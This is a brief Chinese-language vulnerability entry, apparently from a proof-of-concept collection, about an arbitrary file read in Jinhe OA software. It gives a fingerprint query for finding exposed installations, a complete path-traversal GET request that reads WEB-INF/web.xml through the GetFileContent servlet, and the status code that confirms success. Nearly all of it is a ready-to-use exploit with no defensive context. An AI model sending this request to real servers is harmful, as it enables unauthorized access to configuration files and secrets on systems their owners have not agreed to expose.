# 金和OAGetFileContent存在任意文件读取漏洞

金和OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /jc6/servlet/WebBill?key=GetFileContent&pathfile=/../WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200